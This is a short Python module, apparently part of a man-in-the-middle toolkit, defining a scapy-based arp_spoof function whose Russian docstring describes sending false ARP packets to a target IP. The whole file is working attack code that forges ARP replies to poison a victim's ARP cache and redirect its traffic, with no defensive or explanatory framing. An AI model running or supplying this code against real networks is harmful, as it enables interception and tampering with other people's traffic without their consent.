# utils/mitm.py

from scapy.all import ARP, Ether, sendp
import time

def arp_spoof(target_ip, target_mac, spoof_ip):
    """
    Функция для выполнения ARP спуфинга.
    Отправляет ложные ARP пакеты на целевой IP.
    """
    ether_frame = Ether(dst=target_mac)
    arp_packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    sendp(ether_frame/arp_packet, verbose=False)
    print(f"Sent ARP spoof to {target_ip} from {spoof_ip}")

